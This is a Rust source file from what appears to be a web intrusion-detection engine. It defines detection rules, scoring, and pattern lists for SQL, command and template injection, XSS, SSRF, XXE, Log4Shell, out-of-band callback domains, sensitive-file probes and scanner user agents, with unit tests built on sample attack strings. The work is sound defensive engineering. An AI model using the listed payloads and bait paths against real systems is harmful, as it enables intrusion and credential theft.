//! Detection rules.
//!
//! There are two families of rules.
//! * Tripwires (honeytokens, decoy params and routes, seals) are only ever
//!   touched by an attacker, so they carry high confidence and flag a session
//!   at once. They work whether or not the attacking agent follows instructions.
//! * Signals (payloads, bait paths, scanners, behaviour) add evidence to a
//!   session score. One signal alone never flags a session under the default
//!   thresholds, which keeps false positives low.

use crate::normalize::{for_match, Loc, Param};
use serde::Serialize;
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Confidence {
    Low,
    Medium,
    High,
}

#[derive(Debug)]
pub struct RuleDef {
    pub id: &'static str,
    pub title: &'static str,
    pub kind: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    /// Score added the first time this rule fires for a session.
    pub first: u32,
    /// Score added on every later hit.
    pub repeat: u32,
    /// Flag the session immediately, regardless of thresholds.
    pub instant_flag: bool,
    pub attack: &'static [&'static str],
}

macro_rules! rule {
    ($name:ident, $id:expr, $title:expr, $kind:expr, $sev:ident, $conf:ident, $first:expr, $repeat:expr, $instant:expr, [$($t:expr),*]) => {
        pub static $name: RuleDef = RuleDef {
            id: $id, title: $title, kind: $kind,
            severity: Severity::$sev, confidence: Confidence::$conf,
            first: $first, repeat: $repeat, instant_flag: $instant,
            attack: &[$($t),*],
        };
    };
}

// Tripwires
rule!(
    HONEYTOKEN_USED,
    "honeytoken.used",
    "Honeytoken used",
    "detection",
    Critical,
    High,
    100,
    20,
    true,
    ["T1552.001", "T1078"]
);
rule!(
    DECOY_PARAM,
    "decoy.param",
    "Decoy parameter submitted",
    "detection",
    Critical,
    High,
    100,
    20,
    true,
    ["T1190"]
);
rule!(
    TAMPER_SEALED,
    "tamper.sealed_value",
    "Sealed value tampered with",
    "detection",
    Critical,
    High,
    100,
    20,
    true,
    ["T1190"]
);
rule!(
    DECOY_ROUTE,
    "decoy.route",
    "Decoy route accessed",
    "detection",
    High,
    High,
    60,
    10,
    true,
    ["T1595.003"]
);
rule!(
    TAMPER_UNSIGNED_JWT,
    "tamper.unsigned_jwt",
    "Unsigned JWT sent",
    "detection",
    Critical,
    High,
    100,
    20,
    true,
    ["T1606"]
);
rule!(
    TAMPER_DECOY_SECRET,
    "tamper.decoy_secret",
    "Cookie or token signed with a decoy secret",
    "detection",
    Critical,
    High,
    100,
    20,
    true,
    ["T1606", "T1552.001"]
);

// Signals
rule!(
    DECOY_SPEC,
    "decoy.spec",
    "Decoy API description fetched",
    "detection",
    Low,
    Medium,
    15,
    0,
    false,
    ["T1595.003"]
);
rule!(
    BAIT_PATH,
    "bait.path",
    "Sensitive file or admin path probed",
    "detection",
    Medium,
    High,
    30,
    5,
    false,
    ["T1595.003", "T1552.001"]
);
rule!(
    PAYLOAD_SQLI,
    "payload.sqli",
    "SQL injection payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_NOSQLI,
    "payload.nosqli",
    "NoSQL operator injection",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_XSS,
    "payload.xss",
    "Cross-site scripting payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190", "T1059.007"]
);
rule!(
    PAYLOAD_SSTI,
    "payload.ssti",
    "Template injection payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_TRAVERSAL,
    "payload.traversal",
    "Path traversal payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190", "T1083"]
);
rule!(
    PAYLOAD_CMDI,
    "payload.cmdi",
    "Command injection payload",
    "detection",
    High,
    Medium,
    40,
    5,
    false,
    ["T1190", "T1059"]
);
rule!(
    PAYLOAD_SSRF,
    "payload.ssrf",
    "Server-side request forgery payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_XXE,
    "payload.xxe",
    "XML external entity payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_CRLF,
    "payload.crlf",
    "Header injection (CRLF) payload",
    "detection",
    Medium,
    Medium,
    35,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_JNDI,
    "payload.jndi",
    "JNDI / Log4Shell payload",
    "detection",
    High,
    High,
    60,
    5,
    false,
    ["T1190"]
);
rule!(
    PAYLOAD_OAST,
    "payload.oast",
    "Out-of-band callback domain",
    "detection",
    High,
    High,
    60,
    5,
    false,
    ["T1190"]
);
rule!(
    CLIENT_SCANNER,
    "client.scanner",
    "Known attack tool",
    "detection",
    High,
    High,
    50,
    0,
    false,
    ["T1595.002"]
);
rule!(
    CLIENT_AUTOMATION,
    "client.automation",
    "Scripted HTTP client",
    "detection",
    Info,
    Low,
    5,
    0,
    false,
    []
);
rule!(
    CLIENT_AI_AGENT,
    "client.ai_agent",
    "Self-declared AI agent",
    "detection",
    Info,
    High,
    0,
    0,
    false,
    []
);
rule!(
    BEHAVIOR_ENUM,
    "behavior.enumeration",
    "Content enumeration (many 404s)",
    "detection",
    Medium,
    Medium,
    40,
    10,
    false,
    ["T1595.003"]
);
rule!(
    BEHAVIOR_AUTH,
    "behavior.auth_failures",
    "Repeated authentication failures",
    "detection",
    Medium,
    Medium,
    30,
    10,
    false,
    ["T1110"]
);
rule!(
    FORGED_FORWARDING,
    "client.forged_forwarding",
    "Forged client address header",
    "detection",
    Medium,
    High,
    35,
    5,
    false,
    []
);
rule!(
    MALFORMED_BODY,
    "request.malformed_body",
    "Malformed or mis-encoded request body",
    "detection",
    Low,
    Medium,
    20,
    5,
    false,
    []
);
rule!(
    ABSOLUTE_TARGET,
    "request.absolute_target",
    "Absolute URL as request target",
    "detection",
    Low,
    Medium,
    20,
    5,
    false,
    []
);

// Lifecycle
rule!(
    SESSION_FLAGGED,
    "session.flagged",
    "Session flagged as attacker",
    "session",
    High,
    High,
    0,
    0,
    false,
    []
);
rule!(
    CONTAINMENT_STARTED,
    "containment.started",
    "Machine contained",
    "session",
    High,
    High,
    0,
    0,
    false,
    []
);

/// Rules that only an attacker triggers. Honest visitors never use a planted
/// credential, send a decoy field with a changed value, request a decoy route
/// or forge a sealed value. These start containment by default.
pub const CONTAINMENT_TRIPWIRES: &[&str] = &[
    "honeytoken.used",
    "decoy.param",
    "decoy.route",
    "tamper.sealed_value",
];
rule!(
    SYSTEM_STARTED,
    "system.started",
    "Lurensic engine started",
    "system",
    Info,
    High,
    0,
    0,
    false,
    []
);
rule!(
    SYSTEM_SUPPRESSED,
    "system.events_suppressed",
    "Events suppressed by rate limit",
    "system",
    Low,
    High,
    0,
    0,
    false,
    []
);

/// Substring match with word boundaries on alphanumeric pattern edges, so
/// `|id` does not match `|identity` and `union select` does not match
/// `reunion selection`.
fn contains_word(hay: &str, pat: &str) -> bool {
    let h = hay.as_bytes();
    let p = pat.as_bytes();
    let starts_alnum = p.first().is_some_and(|c| c.is_ascii_alphanumeric());
    let ends_alnum = p.last().is_some_and(|c| c.is_ascii_alphanumeric());
    let mut from = 0;
    while let Some(off) = hay[from..].find(pat) {
        let s = from + off;
        let e = s + p.len();
        let ok_start = !starts_alnum || s == 0 || !h[s - 1].is_ascii_alphanumeric();
        let ok_end = !ends_alnum || e == h.len() || !h[e].is_ascii_alphanumeric();
        if ok_start && ok_end {
            return true;
        }
        from = s + 1;
        while from < hay.len() && !hay.is_char_boundary(from) {
            from += 1;
        }
    }
    false
}

/// The set of bytes present in a value. A pattern that uses a byte the value
/// does not contain cannot match, so almost every pattern is rejected without
/// a substring search (ordinary values skip nearly all of the table).
struct ByteSet([u64; 4]);

impl ByteSet {
    fn of(s: &str) -> Self {
        let mut set = [0u64; 4];
        for b in s.bytes() {
            set[(b >> 6) as usize] |= 1 << (b & 63);
        }
        ByteSet(set)
    }

    fn covers(&self, pat: &str) -> bool {
        pat.bytes()
            .all(|b| self.0[(b >> 6) as usize] & (1 << (b & 63)) != 0)
    }
}

fn any_word(hay: &str, set: &ByteSet, pats: &[&str]) -> bool {
    pats.iter()
        .filter(|p| set.covers(p))
        .any(|p| contains_word(hay, p))
}

const SQLI: &[&str] = &[
    "' or '1'='1",
    "' or 1=1",
    "\" or \"1\"=\"1",
    "\" or 1=1",
    "or 1=1--",
    "' or 'a'='a",
    "' or ''='",
    "') or ('1'='1",
    "union select",
    "union all select",
    "pg_sleep(",
    "waitfor delay",
    "benchmark(",
    "information_schema",
    "@@version",
    "extractvalue(",
    "updatexml(",
    "load_file(",
    "into outfile",
    "'--",
    "' --",
    "';--",
    "'#",
    "' #",
    "order by 1--",
    "having 1=1",
    "' and 1=1",
    "' and 1=2",
    "' and sleep(",
    "xp_cmdshell",
    "dbms_pipe",
    "utl_http",
    "concat(0x",
    "sleep(5)",
    "sleep(10)",
    "1' or '1",
];
const XSS: &[&str] = &[
    "<script",
    "javascript:",
    "onerror=",
    "onload=",
    "onmouseover=",
    "onfocus=",
    "ontoggle=",
    "<svg",
    "<iframe",
    "<img src=",
    "alert(",
    "prompt(",
    "document.cookie",
    "srcdoc=",
    "<body onload",
    "<details open",
];
const SSTI: &[&str] = &[
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7",
    "#{7*7}",
    "{{config",
    "{{self",
    "__class__",
    "__globals__",
    "{{7*'7'}}",
    "*{7*7}",
    "${{",
    "{{''.",
    "{% import",
    "{{request",
    "@(7*7)",
];
const TRAVERSAL: &[&str] = &[
    "../",
    "..\\",
    "..;/",
    "/etc/passwd",
    "/etc/shadow",
    "win.ini",
    "boot.ini",
    "/proc/self/",
    "c:\\windows",
    "\\windows\\system32",
    "/.htpasswd",
    "web-inf/web.xml",
];
const CMDI: &[&str] = &[
    ";id",
    "; id",
    "|id",
    "| id",
    "&&id",
    "&& id",
    "`id`",
    "$(id)",
    ";whoami",
    "; whoami",
    "|whoami",
    "| whoami",
    "&& whoami",
    "$(whoami)",
    "`whoami`",
    "/bin/sh",
    "/bin/bash",
    "cmd.exe /c",
    "powershell -",
    "nc -e",
    "; uname",
    "| uname",
    "; sleep ",
    "| sleep ",
    "$(sleep",
    "`sleep",
    "; ping -",
    "| ping -",
    ";cat /",
    "; cat /",
    "| cat /",
    "& ping -n",
    "; curl ",
    "| curl ",
    "$(curl",
    "; wget ",
    "| wget ",
];
const SSRF: &[&str] = &[
    "169.254.169.254",
    "metadata.google.internal",
    "100.100.100.200",
    "file://",
    "gopher://",
    "dict://",
    "ldap://",
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "[::1]",
    "2130706433",
    "0x7f000001",
    "169.254.170.2",
];
const XXE: &[&str] = &["<!entity", "xi:include", "system \"file:", "system 'file:"];
// "{jndi:" also covers nested forms such as "${{jndi:" seen in live traffic.
const JNDI: &[&str] = &["{jndi:", "${${", "${lower:", "${env:", "${sys:"];
const OAST: &[&str] = &[
    "oast.fun",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.me",
    "interact.sh",
    "burpcollaborator.net",
    "oastify.com",
    "dnslog.cn",
    "requestbin",
    "webhook.site",
    "pipedream.net",
    "ngrok.io",
    "canarytokens.com",
    "xss.ht",
    "bxss.me",
];
const NOSQLI_VALUES: &[&str] = &[
    "{\"$ne\"",
    "{\"$gt\"",
    "{\"$where\"",
    "{\"$regex\"",
    "{'$ne'",
    "{'$gt'",
    "[$ne]",
    "[$gt]",
    "[$regex]",
];

/// True when `b[i..]` starts with the word `w`, with no letter or digit
/// directly before or after it.
fn word_at(b: &[u8], i: usize, w: &[u8]) -> bool {
    b[i..].starts_with(w)
        && (i == 0 || !b[i - 1].is_ascii_alphanumeric())
        && !b.get(i + w.len()).is_some_and(u8::is_ascii_alphanumeric)
}

fn skip_spaces(b: &[u8], mut i: usize) -> usize {
    while b.get(i) == Some(&b' ') {
        i += 1;
    }
    i
}

/// A literal operand at `i`: a number, a quoted string or a boolean word.
/// Returns where it ends and whether it is a number or `true`. A quoted
/// string may be left open at the end of the value only when `open_ok`,
/// because the application's own closing quote completes it.
fn sql_literal(b: &[u8], i: usize, open_ok: bool) -> Option<(usize, bool)> {
    let c = *b.get(i)?;
    if c == b'\'' || c == b'"' {
        return match b[i + 1..].iter().position(|&x| x == c) {
            Some(n) => Some((i + n + 2, false)),
            None if open_ok => Some((b.len(), false)),
            None => None,
        };
    }
    let mut j = i;
    if c == b'-' {
        j += 1;
    }
    let start = j;
    while b.get(j).is_some_and(u8::is_ascii_digit) {
        j += 1;
    }
    if j > start {
        if b.get(j) == Some(&b'.') && b.get(j + 1).is_some_and(u8::is_ascii_digit) {
            j += 1;
            while b.get(j).is_some_and(u8::is_ascii_digit) {
                j += 1;
            }
        }
        return (!b.get(j).is_some_and(u8::is_ascii_alphabetic)).then_some((j, true));
    }
    for w in [&b"true"[..], b"false", b"null"] {
        if word_at(b, i, w) {
            return Some((i + w.len(), w == b"true"));
        }
    }
    None
}

/// The length of a comparison operator at `i`.
fn sql_comparison(b: &[u8], i: usize) -> Option<usize> {
    for op in [
        &b"<=>"[..],
        b"==",
        b"!=",
        b"<>",
        b"<=",
        b">=",
        b"=",
        b"<",
        b">",
    ] {
        if b[i..].starts_with(op) {
            return Some(op.len());
        }
    }
    ["like", "regexp", "rlike", "is"]
        .iter()
        .find(|w| word_at(b, i, w.as_bytes()))
        .map(|w| w.len())
}

/// A literal compared with a literal, such as `2=2`, `'x'='x` or `3>1`, or a
/// bare `1` or `true` cut off by a comment, such as `true--`.
fn sql_constant_test(b: &[u8], i: usize) -> bool {
    let mut i = skip_spaces(b, i);
    while b.get(i) == Some(&b'(') {
        i = skip_spaces(b, i + 1);
    }
    let Some((end, truthy)) = sql_literal(b, i, false) else {
        return false;
    };
    let mut j = skip_spaces(b, end);
    while b.get(j) == Some(&b')') {
        j = skip_spaces(b, j + 1);
    }
    if let Some(n) = sql_comparison(b, j) {
        j = skip_spaces(b, j + n);
        while b.get(j) == Some(&b'(') {
            j = skip_spaces(b, j + 1);
        }
        return sql_literal(b, j, true).is_some();
    }
    truthy
        && (b[j..].starts_with(b"--")
            || b[j..].starts_with(b"#")
            || b[j..].starts_with(b"/*")
            || b[j..].starts_with(b";"))
}

/// What comes before a boolean operator in an injection: a closing quote,
/// backtick or bracket that ends the application's own value, or a value that
/// is only a number, as in `id=1 or 2=2`.
fn sql_breaks_out(b: &[u8], i: usize) -> bool {
    let mut j = i;
    while j > 0 && b[j - 1] == b' ' {
        j -= 1;
    }
    if j == 0 {
        return false;
    }
    if matches!(b[j - 1], b'\'' | b'"' | b'`' | b')') {
        return true;
    }
    let head = &b[..j];
    let digits = head.strip_prefix(b"-").unwrap_or(head);
    !digits.is_empty() && digits.iter().all(u8::is_ascii_digit)
}

/// Always-true and always-false tests injected into a query, such as
/// `' or 2=2--`, `") or ('x'='x` and `1 and 3>2`. The table above lists only
/// the `1=1` forms, and tools and agents vary the numbers and strings.
fn sql_tautology(m: &str) -> bool {
    let b = m.as_bytes();
    let mut i = 0;
    while i < b.len() {
        let op = if word_at(b, i, b"or") {
            2
        } else if word_at(b, i, b"and") || word_at(b, i, b"xor") {
            3
        } else if b[i..].starts_with(b"||") || b[i..].starts_with(b"&&") {
            2
        } else {
            0
        };
        if op > 0 && sql_breaks_out(b, i) && sql_constant_test(b, i + op) {
            return true;
        }
        i += 1;
    }
    false
}

/// Payload rules matching one parameter.
pub fn payload_rules(p: &Param) -> Vec<&'static RuleDef> {
    let mut hits: Vec<&'static RuleDef> = Vec::new();
    let name_l = p.name.to_ascii_lowercase();
    if name_l.contains("[$") || (p.loc == Loc::Body && name_l.starts_with('$')) {
        hits.push(&PAYLOAD_NOSQLI);
    }
    if p.value.is_empty() {
        return hits;
    }
    let m = for_match(&p.value);
    let set = ByteSet::of(&m);
    if any_word(&m, &set, SQLI) || sql_tautology(&m) {
        hits.push(&PAYLOAD_SQLI);
    }
    if any_word(&m, &set, XSS) {
        hits.push(&PAYLOAD_XSS);
    }
    if any_word(&m, &set, SSTI) {
        hits.push(&PAYLOAD_SSTI);
    }
    if any_word(&m, &set, TRAVERSAL) || m.contains('\0') {
        hits.push(&PAYLOAD_TRAVERSAL);
    }
    if any_word(&m, &set, CMDI) {
        hits.push(&PAYLOAD_CMDI);
    }
    if matches!(p.loc, Loc::Query | Loc::Body) && any_word(&m, &set, SSRF) {
        hits.push(&PAYLOAD_SSRF);
    }
    if any_word(&m, &set, XXE) {
        hits.push(&PAYLOAD_XXE);
    }
    if any_word(&m, &set, JNDI) {
        hits.push(&PAYLOAD_JNDI);
    }
    if any_word(&m, &set, OAST) {
        hits.push(&PAYLOAD_OAST);
    }
    if any_word(&m, &set, NOSQLI_VALUES) && !hits.iter().any(|r| r.id == PAYLOAD_NOSQLI.id) {
        hits.push(&PAYLOAD_NOSQLI);
    }
    if matches!(p.loc, Loc::Query | Loc::Path | Loc::Header) {
        let decoded = crate::normalize::deep_decode(&p.value);
        if decoded.contains("\r\n") || (decoded.contains('\n') && p.loc != Loc::Header) {
            hits.push(&PAYLOAD_CRLF);
        }
    }
    hits
}

const BAIT_EXACT: &[&str] = &[
    "/.env",
    "/.aws/credentials",
    "/.git/config",
    "/.git/head",
    "/.htpasswd",
    "/.htaccess",
    "/web.config",
    "/phpinfo.php",
    "/info.php",
    "/server-status",
    "/server-info",
    "/wp-login.php",
    "/xmlrpc.php",
    "/.ds_store",
    "/backup.sql",
    "/dump.sql",
    "/database.sql",
    "/db.sql",
    "/.npmrc",
    "/.dockercfg",
    "/docker-compose.yml",
    "/id_rsa",
    "/.bash_history",
    "/.vscode/sftp.json",
    "/sftp-config.json",
    "/elmah.axd",
    "/trace.axd",
    "/config.json.bak",
    "/.git-credentials",
    "/admin.php",
    "/credentials.json",
    "/secrets.json",
];
const BAIT_PREFIX: &[&str] = &[
    "/.env.",
    "/.git/",
    "/.svn/",
    "/.hg/",
    "/.ssh/",
    "/.aws/",
    "/wp-admin",
    "/wp-content/plugins",
    "/phpmyadmin",
    "/pma/",
    "/actuator",
    "/cgi-bin/",
    "/debug/pprof",
    "/vendor/phpunit",
    "/manager/html",
    "/jmx-console",
    "/.terraform",
    "/_ignition",
    "/solr/admin",
];
const BAIT_SUFFIX: &[&str] = &[
    ".bak",
    ".old",
    ".swp",
    ".orig",
    "~",
    ".sql.gz",
    ".tar.gz.bak",
];

pub(crate) fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'-' | b'+' => 62,
            b'_' | b'/' => 63,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// The value without a leading `Bearer ` in any casing. Attacker text can
/// start with a multi-byte character, so the prefix is read with `get`, which
/// never splits a character.
pub(crate) fn strip_bearer(value: &str) -> &str {
    let v = value.trim();
    match (v.get(..7), v.get(7..)) {
        (Some(p), Some(rest)) if p.eq_ignore_ascii_case("bearer ") => rest.trim(),
        _ => v,
    }
}

/// An unsigned JWT is a token whose header says `alg: none` (in any casing)
/// or whose signature segment is empty. Servers never issue one, so a client
/// that sends one has forged it. Returns the header's `alg` value. A token
/// whose signature was changed cannot be told apart without the app's key, so
/// it is not detected here.
pub fn unsigned_jwt(value: &str) -> Option<String> {
    let v = strip_bearer(value);
    if v.len() > 8192 || !v.starts_with("eyJ") {
        return None;
    }
    let mut parts = v.split('.');
    let (header, payload, signature) = (parts.next()?, parts.next()?, parts.next()?);
    if parts.next().is_some() || payload.is_empty() || header.len() > 1024 {
        return None;
    }
    let decoded = b64url_decode(header)?;
    let json: Value = serde_json::from_slice(&decoded).ok()?;
    let alg = json.get("alg")?.as_str()?;
    (alg.trim().eq_ignore_ascii_case("none") || signature.is_empty())
        .then(|| crate::normalize::sanitize(alg, 16))
}

/// Returns the matched pattern if the path is a classic sensitive-file probe.
pub fn bait_path(norm_path: &str) -> Option<&'static str> {
    if let Some(p) = BAIT_EXACT.iter().find(|p| norm_path == **p) {
        return Some(p);
    }
    if let Some(p) = BAIT_PREFIX.iter().find(|p| norm_path.starts_with(**p)) {
        return Some(p);
    }
    BAIT_SUFFIX
        .iter()
        .find(|s| norm_path.ends_with(**s))
        .copied()
}

const SCANNERS: &[&str] = &[
    "sqlmap",
    "nikto",
    "nuclei",
    "ffuf",
    "gobuster",
    "dirbuster",
    "dirb/",
    "wfuzz",
    "feroxbuster",
    "masscan",
    "zgrab",
    "nmap",
    "acunetix",
    "netsparker",
    "wpscan",
    "whatweb",
    "arachni",
    "openvas",
    "jaeles",
    "hydra",
    "commix",
    "xsstrike",
    "dalfox",
    "zaproxy",
    "owasp zap",
    "burp",
    "qualys",
    "nessus",
    "w3af",
    "skipfish",
    "vega/",
    "wapiti",
    "interactsh",
    "katana",
];
const AUTOMATION: &[&str] = &[
    "python-requests",
    "python-urllib",
    "python-httpx",
    "aiohttp",
    "go-http-client",
    "curl/",
    "wget/",
    "node-fetch",
    "axios/",
    "undici",
    "libwww-perl",
    "okhttp",
    "java/",
    "httpclient",
    "headlesschrome",
    "phantomjs",
    "scrapy",
    "httpie",
    "powershell",
    "postmanruntime",
    "insomnia",
];
const AI_AGENTS: &[&str] = &[
    "claude-user",
    "claudebot",
    "claude-web",
    "anthropic-ai",
    "chatgpt-user",
    "gptbot",
    "oai-searchbot",
    "perplexity-user",
    "perplexitybot",
    "google-extended",
    "meta-externalagent",
    "bytespider",
    "ai2bot",
    "cohere-ai",
    "mistralai-user",
    "duckassistbot",
];

/// Headers that proxies use to pass on the original client address.
const FORWARDING_HEADERS: &[&str] = &[
    "x-forwarded-for",
    "x-real-ip",
    "x-client-ip",
    "true-client-ip",
    "cf-connecting-ip",
    "x-originating-ip",
    "x-remote-ip",
    "x-remote-addr",
    "x-cluster-client-ip",
    "client-ip",
    "fastly-client-ip",
];

/// An address as proxies write it, with an optional port. `unknown` is what
/// some proxies write when they don't know the address.
fn valid_address(s: &str) -> bool {
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    let s = s.trim().trim_matches('"');
    if s.eq_ignore_ascii_case("unknown") || s.parse::<IpAddr>().is_ok() {
        return true;
    }
    if let Some(rest) = s.strip_prefix('[') {
        return match rest.split_once(']') {
            Some((ip, tail)) => {
                ip.parse::<Ipv6Addr>().is_ok()
                    && (tail.is_empty()
                        || tail
                            .strip_prefix(':')
                            .is_some_and(|p| p.parse::<u16>().is_ok()))
            }
            None => false,
        };
    }
    match s.rsplit_once(':') {
        Some((ip, port)) => ip.parse::<Ipv4Addr>().is_ok() && port.parse::<u16>().is_ok(),
        None => false,
    }
}

/// Finds a client address header holding something no proxy would write,
/// such as markup, hostnames, CIDR ranges or injected line breaks. Agents
/// forge these headers to bypass IP checks or to split their traffic into
/// many apparent clients. Private and loopback addresses are not flagged,
/// because real proxy chains contain them.
pub fn forged_forwarding(headers: &[(String, String)]) -> Option<(String, String)> {
    for (name, value) in headers {
        let lname = name.to_ascii_lowercase();
        if value.trim().is_empty() {
            continue;
        }
        let forged = if FORWARDING_HEADERS.contains(&lname.as_str()) {
            value.split(',').any(|part| !valid_address(part))
        } else if lname == "forwarded" {
            value
                .split([',', ';'])
                .filter_map(|el| {
                    let el = el.trim();
                    el.get(..4)
                        .filter(|p| p.eq_ignore_ascii_case("for="))
                        .map(|_| el[4..].trim_matches('"'))
                })
                .any(|v| !v.starts_with('_') && !valid_address(v))
        } else {
            false
        };
        if forged {
            return Some((lname, value.clone()));
        }
    }
    None
}

pub fn classify_ua(ua: &str) -> Vec<(&'static RuleDef, &'static str)> {
    let l = ua.to_ascii_lowercase();
    let mut out = Vec::new();
    if l.trim().is_empty() {
        out.push((&CLIENT_AUTOMATION, "(empty user-agent)"));
        return out;
    }
    if let Some(s) = SCANNERS.iter().find(|s| l.contains(**s)) {
        out.push((&CLIENT_SCANNER, *s));
    }
    if let Some(s) = AUTOMATION.iter().find(|s| l.contains(**s)) {
        out.push((&CLIENT_AUTOMATION, *s));
    }
    if let Some(s) = AI_AGENTS.iter().find(|s| l.contains(**s)) {
        out.push((&CLIENT_AI_AGENT, *s));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn q(v: &str) -> Vec<&'static str> {
        payload_rules(&Param {
            loc: Loc::Query,
            name: "q".into(),
            value: v.into(),
        })
        .iter()
        .map(|r| r.id)
        .collect()
    }

    #[test]
    fn detects_common_payloads() {
        assert_eq!(q("1' OR '1'='1"), vec!["payload.sqli"]);
        assert_eq!(
            q("1 UNION/**/SELECT username,password FROM users"),
            vec!["payload.sqli"]
        );
        assert_eq!(q("%3Cscript%3Ealert(1)%3C/script%3E"), vec!["payload.xss"]);
        assert_eq!(q("{{7*7}}"), vec!["payload.ssti"]);
        assert_eq!(q("....//....//etc/passwd"), vec!["payload.traversal"]);
        assert_eq!(q("x; id"), vec!["payload.cmdi"]);
        assert_eq!(
            q("http://169.254.169.254/latest/meta-data/"),
            vec!["payload.ssrf"]
        );
        assert_eq!(
            q("${jndi:ldap://x.oast.fun/a}"),
            vec!["payload.ssrf", "payload.jndi", "payload.oast"]
        );
    }

    #[test]
    fn detects_varied_sql_tautologies() {
        for v in [
            "' OR 0=0--",
            "' OR 2=2",
            "' or 7=7 -- -",
            "1' oR 5=5 #",
            "\" or 3>2 --",
            "') or ('x'='x",
            "\") OR (\"b\"=\"b",
            "admin' or 'b'='b",
            "' OR 'abc' LIKE 'abc",
            "' or 2<>3--",
            "'||'a'='a",
            "' && 4=4--",
            "' xor 1=2--",
            "' or true--",
            "' or 1#",
            "' or (2)=(2)--",
            "1 or 2=2",
            "-1 OR 7=7",
            "10 and 3>2",
            "'/**/or/**/2=2--",
            "%27%20OR%203%3D3--",
            "x' AND 'q'='q",
        ] {
            assert_eq!(q(v), vec!["payload.sqli"], "missed {v:?}");
        }
    }

    #[test]
    fn ordinary_input_is_clean() {
        for v in [
            "blue rain jacket",
            "Reunion selection 2026",
            "O'Brien",
            "what's on sale?",
            "identity|identifier",
            "size: M; colour: navy",
            "50% off & free shipping",
            "I'd like to confirm (yes)",
            "https://example.com/products?id=3",
            "C'est la vie -- vraiment",
            "rock 'n' roll or jazz",
            "\"red\" or \"blue\"",
            "it's 'small' or 'large'",
            "5' or 6' tall",
            "size 'M' and 2 colours",
            "Q1 and 2026 plans",
            "x=1 and y=2",
            "price 5 or 10 = 15",
            "1 or 2",
            "tom && jerry",
            "'quoted' or true love",
            "true or false",
            "fish 'n' chips || mushy peas",
        ] {
            assert!(q(v).is_empty(), "false positive on {v:?}: {:?}", q(v));
        }
    }

    #[test]
    fn bait_paths() {
        assert_eq!(bait_path("/.env"), Some("/.env"));
        assert_eq!(bait_path("/.env.production"), Some("/.env."));
        assert_eq!(bait_path("/index.php.bak"), Some(".bak"));
        assert_eq!(bait_path("/products/env"), None);
        assert_eq!(bait_path("/environment"), None);
    }

    #[test]
    fn user_agents() {
        assert_eq!(classify_ua("sqlmap/1.8#stable")[0].0.id, "client.scanner");
        assert_eq!(
            classify_ua("python-requests/2.32")[0].0.id,
            "client.automation"
        );
        assert!(classify_ua(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131 Safari/537.36"
        )
        .is_empty());
    }
}
